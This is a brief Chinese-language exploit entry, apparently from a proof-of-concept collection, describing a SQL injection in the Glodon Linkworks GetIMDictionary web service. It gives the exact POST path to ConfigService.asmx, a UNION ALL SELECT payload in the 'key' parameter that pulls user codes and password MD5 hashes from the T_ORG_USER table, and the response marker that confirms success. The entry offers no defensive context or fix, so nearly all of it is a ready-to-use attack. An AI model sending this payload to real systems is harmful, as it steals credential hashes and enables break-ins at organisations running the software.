# 广联达LinkworksGetIMDictionarySQL注入

广联达LinkworksGetIMDictionary ｜ SQL注入 ｜ —
- **请求**：`POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1`

**Payload**
```
key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```
- **响应特征**：200 result